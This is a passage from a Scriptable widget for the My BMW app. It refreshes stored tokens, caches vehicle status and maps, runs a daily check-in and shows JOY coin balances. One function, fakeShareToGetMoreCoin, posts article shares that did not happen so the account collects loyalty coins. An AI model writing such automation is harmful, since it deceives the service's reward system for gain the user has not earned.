          console.log('load map from cache');
          let data = Data.fromFile(cacheFile);
          let img = Image.fromData(data);
          return img;
        }
        console.log('load map from API');
        let req = new Request(url);
        req.method = 'GET';
        const res = await req.load();
        try {
          let fileManager = FileManager.local();
          fileManager.write(cacheFile, res);
          console.warn(cacheFile + ' downloaded');
        } catch (e) {
          console.error(e.message);
        }
          // 存储到缓存
          //FileManager.local().writeImage(cacheFile, img);
        let data = Data.fromFile(cacheFile);
        let img = Image.fromData(data);
        return img;
      } catch (e) {
        console.log('load map failed');
        console.error(e.message);
        let canvas = new DrawContext();
        canvas.size = new Size(width, height);
        canvas.setFillColor(new Color('#eee'));
        canvas.fillRect(new Rect(0, 0, width, height));
        canvas.drawTextInRect(e.message || '获取地图失败', new Rect(20, 20, width, height));
        return await canvas.getImage();
      }
  }

  getControlMessages(data) {
    try {
    if (this.userConfigData.show_control_checks == 2) {
      return [];
    }
    let checkControlMessages=Array(0)
    if (data.state.checkControlMessages) {
      for (const key in data.state.checkControlMessages) {
        if (!data.state.checkControlMessages[key]) {
          continue;
        }
        if (data.state.checkControlMessages[key]['name']) {
          checkControlMessages.push(data.state.checkControlMessages[key]);
        }
      }
    }
      return checkControlMessages;
    } catch (e) {
      console.error(e);
      return [];
    }
  }
  getFuelIndicators(combustionFuelLevel) {
    let _fuelObj = {
      levelValue: null,
      rangeValue: null,
      chargingType: null
    };
    try {
      if(combustionFuelLevel.range && combustionFuelLevel.remainingFuelPercent){
        if (!_fuelObj['rangeValue']) {
          _fuelObj['rangeValue'] = Number(combustionFuelLevel['range']);
          _fuelObj['levelValue'] = combustionFuelLevel['remainingFuelPercent'];
        }
        if (Number(combustionFuelLevel['rangeValue']) >= _fuelObj['rangeValue']) {
          _fuelObj['rangeValue'] = Number(combustionFuelLevel['rangeValue']);
        }
      }
    } catch (e) {}
    for (const key in _fuelObj) {
      if (!_fuelObj[key]) {
        _fuelObj[key] = '';
      }
    }
    return _fuelObj;
  }
  buildMapURL(data) {
    let locationStr = '';
    let latLng = '';
    try {
      locationStr = data.state.location.address.formatted;
      latLng =
        data.state.location.coordinates.longitude +
        ',' +
        data.state.location.coordinates.latitude;
    } catch (e) {
      return '';
    }
    return `http://maps.apple.com/?address=${encodeURI(locationStr)}&ll=${latLng}&t=m`;
  }
  formatStatusLabel(data) {
    if (!data.state || !data.state.lastUpdatedAt) {
      return '';
    }
    let lastUpdated = new Date(data.state.lastUpdatedAt);
    const today = new Date();
    let formatter = 'MM-dd HH:mm';
    if (lastUpdated.getDate() == today.getDate()) {
      formatter = 'HH:mm';
    }
    let dateFormatter = new DateFormatter();
    dateFormatter.dateFormat = formatter;
    let dateStr = dateFormatter.string(lastUpdated);
    // get today
    return `${dateStr}更新`;
  }
  async getData(forceRefresh = false) {
    let accessToken = await this.getAccessToken(forceRefresh);
    if (!accessToken || accessToken == '') {
      return null;
    }
    try {
      await this.checkInDaily(accessToken);
    } catch (e) {
      console.error('Check In Error: ' + e.message);
    }
    return await this.getVehicleDetails(forceRefresh);
  }

  async getAccessToken(forceRefresh = false) {
    let accessToken = '';
    let refreshToken = Keychain.get(REFRESH_TOKEN);
    if (!forceRefresh && Keychain.contains(TOKEN_UPDATE_LAST_AT)) {
      let lastUpdate = parseInt(Keychain.get(TOKEN_UPDATE_LAST_AT));
      if (lastUpdate > new Date().valueOf() - 1000 * 60 * 50) {
        if (Keychain.contains(ACCESS_TOKEN)) {
          accessToken = Keychain.get(ACCESS_TOKEN);
        }
      } else {
        if (Keychain.contains(REFRESH_TOKEN)) {
            // get refresh token
            accessToken = await this.refreshToken(refreshToken);
        }
      }
    }
    if (accessToken && accessToken != '') {
      return accessToken;
    }
    accessToken = await this.refreshToken(refreshToken);
    return accessToken;
  }

  async refreshToken(refresh_token) {
    let req = new Request(BMW_SERVER_HOST + '/eadrax-coas/v1/oauth/token');
    req.headers = {
      ...BMW_HEADERS,
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
    };
    req.method = 'POST';
    req.body = `grant_type=refresh_token&refresh_token=${refresh_token}`;
    const res = await req.loadJSON();
    if (res.access_token !== undefined) {
      const {access_token, refresh_token} = res;
      Keychain.set(ACCESS_TOKEN, access_token);
      Keychain.set(REFRESH_TOKEN, refresh_token);
      Keychain.set(TOKEN_UPDATE_LAST_AT, String(new Date().valueOf()));
      return access_token;
     } else {
      return '';
    }
  }
  async get_Base(){
    let accessToken = await this.getAccessToken(false);
    const e = new Request(`https://myprofile.bmw.com.cn/eadrax-vcs/v2/vehicles?`);
    let a = BMW_HEADERS;
    e.headers =  Object.assign(a, {
      "authorization": "Bearer " + accessToken
    });
    const t = await e.loadJSON(); 
    return  t[0]
  }
  async v_state(e) {
    let accessToken = await this.getAccessToken(false);
    const t = new Request(`https://myprofile.bmw.com.cn/eadrax-vcs/v4/vehicles/state?`);
    let a = BMW_HEADERS;
    t.headers = Object.assign(a, {
      "bmw-vin": e,
      "authorization": "Bearer " + accessToken
    });
    const n = await t.loadJSON();
    return Promise.resolve(n)
  }
  async getVehicleDetails(forceRefresh = false) {
    let vin = this.userConfigData.vin || '';
    let lastUpdateKey = vin + VEHICLE_UPDATE_LAST_AT;
    let localVehicleDataKey = vin + MY_BMW_VEHICLE_DATA;
    let cacheData = this.loadVehicleFromCache(vin);
    // skip update prevent access to bmw too much
    if (!forceRefresh && cacheData) {
      if (Keychain.contains(lastUpdateKey)) {
        let lastUpdate = parseInt(Keychain.get(lastUpdateKey));
        // if last check within 5 mins we return cache
        if (lastUpdate > new Date()
          .valueOf() - 1000 * 60 * 5) {
          console.log('Get vehicle data from cache');
          // return cacheData;
        }
      }
    }
    let vehicleData = null;
    let Info = null;
    try {
      console.log('Start to get vehicle details online');
      if (forceRefresh) {
        let myInfo = await this.get_Base();
        Info = Object.assign({
          "model": myInfo.model,
          "brand": myInfo.brand,
          "vin": myInfo.vin,
          "licensePlate": myInfo.licensePlate
        });
        Keychain.set(MY_BMW_VEHICLE_VIN, JSON.stringify(Info));
      }
      let vehicles = null;
      if (Keychain.contains(MY_BMW_VEHICLE_VIN))
        vehicles = await this.v_state(JSON.parse(Keychain.get(MY_BMW_VEHICLE_VIN))
          .vin);
      if (vehicles) {
        console.log('Get vehicle details success');
        if (vin && vin.length > 0) {
          // if more than one vehicle
          let vehicleFound = vehicles.find((vehicle) => {
            return vehicle.vin && vehicle.vin.toUpperCase() == vin.toUpperCase();
          });
          if (vehicleFound) {
            console.log('VIN matched and found: ' + vin);
            vehicleData = vehicleFound;
          }
        }
        vehicleData = vehicleData || vehicles;
        if (vehicleData) {
          Keychain.set(lastUpdateKey, String(new Date()
            .valueOf()));
          delete vehicleData.capabilities
          if (Keychain.contains(MY_BMW_VEHICLE_VIN)) {
            vehicleData.model = JSON.parse(Keychain.get(MY_BMW_VEHICLE_VIN))
              .model
            vehicleData.brand = JSON.parse(Keychain.get(MY_BMW_VEHICLE_VIN))
              .brand
            vehicleData.vin = JSON.parse(Keychain.get(MY_BMW_VEHICLE_VIN))
              .vin
          }
          Keychain.set(localVehicleDataKey, JSON.stringify(vehicleData));

          if (config.runsInApp) {
            const confirmationAlert = new Alert();

            confirmationAlert.title = '成功';
            confirmationAlert.message =
              '车辆信息获取成功，请在桌面配置小组件。更多小组件设置请点击 开始配置';
            confirmationAlert.addCancelAction('跳过');
            confirmationAlert.addAction('开始配置');
            let userSelection = await confirmationAlert.presentAlert();
            if (userSelection != -1) {
              await this.userConfigInput();
            }
          }
        }
      }
    } catch (e) {
      console.log(e)
      if (config.runsInApp) {
        const confirmationAlert = new Alert();
        confirmationAlert.title = '错误';
        confirmationAlert.message = '尝试获取车辆信息失败，请重新尝试登录。';
        confirmationAlert.addCancelAction('确定');
        await confirmationAlert.presentAlert();
      }
    }
    // if vehicle data is not found we use cache
    return vehicleData && vehicleData.vin ? vehicleData : cacheData;
  }
  async loadVehicleFromCache(vin) {
    let localVehicleDataKey = vin + MY_BMW_VEHICLE_DATA;
    try {
      if (Keychain.contains(localVehicleDataKey)) {
        let cachedVehicleData = JSON.parse(Keychain.get(localVehicleDataKey));
        // load data every 5 mins
        if (cachedVehicleData && cachedVehicleData.vin) {
          return cachedVehicleData;
        }
      }
    } catch (e) {
      console.warn('Load vehicle from cache failed');
    }
    return null;
  }
  async checkInDaily(accesstoken) {
    let dateFormatter = new DateFormatter();
    const lastCheckIn = Keychain.contains(LAST_CHECK_IN_AT) ? Keychain.get(LAST_CHECK_IN_AT) : null;

    dateFormatter.dateFormat = 'yyyy-MM-dd';
    let today = dateFormatter.string(new Date());
    if (Keychain.contains(LAST_CHECK_IN_AT)) {
      console.log('last checked in at: ' + lastCheckIn);
      if (lastCheckIn == today) {
        console.log('User has checked in today');
        return;
      }
    }
    console.log('Start check in');
    let req = new Request(BMW_SERVER_HOST + '/cis/eadrax-community/private-api/v1/mine/check-in');
    req.headers = {
      ...BMW_HEADERS,
      authorization: 'Bearer ' + accesstoken,
      'content-type': 'application/json; charset=utf-8'
    };
    req.method = 'POST';
    req.body = JSON.stringify({
      signDate: null
    });
    const res = await req.loadJSON();
    if (Number(res.code) >= 200 && Number(res.code) <= 300) {
      Keychain.set(LAST_CHECK_IN_AT, today);
    }
    let msg = `${res.message || ''}`;
    if (res.code != 200) {
      msg += `: ${res.businessCode || ''}, 上次签到: ${lastCheckIn || 'None'}.`;
      this.notify('My BMW签到', msg);
    }
    try {
      await this.fakeShareToGetMoreCoin(accesstoken);
    } catch (e) {
      console.error(e.message);
    }

    // check coin amount
    try {
      await this.getJoyCoinInfo(accesstoken);
    } catch (e) {
      console.error(e.message);
    }
  }
  async getJoyCoinInfo(accesstoken) {
    let req = new Request(BMW_SERVER_HOST + '/cis/eadrax-membership/api/v2/joy-list');
    req.headers = {
      ...BMW_HEADERS,
      authorization: 'Bearer ' + accesstoken,
      'content-type': 'application/json; charset=utf-8'
    };

    req.method = 'POST';
    req.body = JSON.stringify({});

    const res = await req.loadJSON();
    if (res.code >= 200 && res.code < 300) {
      let message = `签到成功，当前共${res.data.joyCoin || 0} JOY币， ${res.data.joySocialHeader}`;
      console.log(message);
      this.notify('My BMW签到', message);
    }
  }

  async fakeShareToGetMoreCoin(accesstoken) {
    console.log('Start to fake post');

    let req = new Request(BMW_SERVER_HOST + '/cis/eadrax-ocommunity/public-api/v1/article-list');
    req.headers = {
      ...BMW_HEADERS,
      authorization: 'Bearer ' + accesstoken,
      'content-type': 'application/json; charset=utf-8'
    };

    req.method = 'POST';
    req.body = JSON.stringify({
      pageNum: 1,
      pageSize: 1,
      boardCode: 0
    });

    const res = await req.loadJSON();

    if (Number(res.code) >= 200 && Number(res.code) <= 300) {
      if (!res.data || !res.data.articleVos || !res.data.articleVos[0] || !res.data.articleVos[0].articleId) {
        throw 'No article found';
      }

      // then fake post article to get Joy coin
      req = new Request(BMW_SERVER_HOST + '/cis/eadrax-oarticle/open/article/api/v2/share-article');

      req.headers = {
        ...BMW_HEADERS,
        authorization: 'Bearer ' + accesstoken,
        'content-type': 'application/json; charset=utf-8'
      };

      req.method = 'POST';
      req.body = JSON.stringify({
        articleId: res.data.articleVos[0].articleId
      });

      const result = await req.loadJSON();

      return !!result;
    }

    return false;
  }
  async getVehicleImage(data) {
    let imageCar = '';
    if (this.userConfigData.custom_vehicle_image) {
      try {
        imageCar = await this.getImageByUrl(this.userConfigData.custom_vehicle_image);
      } catch (e) {
        return this.loadDefaultImage();
      }
    } else {
        try {
          imageCar = await this.getBMWImage(data, "VehicleStatus");
        } catch (e) {
          return this.loadDefaultImage();
        }
    }
    return imageCar;
  }

  async loadDefaultImage() {
    let defaultImage =
      'iVBORw0KGgoAAAANSUhEUgAAAlgAAAD3CAYAAADBsyrOAAAAAXNSR0IArs4c6QAAAKRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgExAAIAAAAfAAAAWodpAAQAAAABAAAAegAAAAAAAAEsAAAAAQAAASwAAAABQWRvYmUgUGhvdG9zaG9wIDIwMjEgTWFjaW50b3NoAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAACWKADAAQAAAABAAAA9wAAAADO55/aAAAACXBIWXMAAC4jAAAuIwF4pT92AAAE62lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNi4wLjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8eG1wOkNyZWF0b3JUb29sPkFkb2JlIFBob3Rvc2hvcCAyMDIxIE1hY2ludG9zaDwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wTU06RGVyaXZlZEZyb20gcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICA8c3RSZWY6aW5zdGFuY2VJRD54bXAuaWlkOjhhODNmMGE3LTA4MWQtNDI4NS1hMTlkLWViMTgyZjU1YjA5MDwvc3RSZWY6aW5zdGFuY2VJ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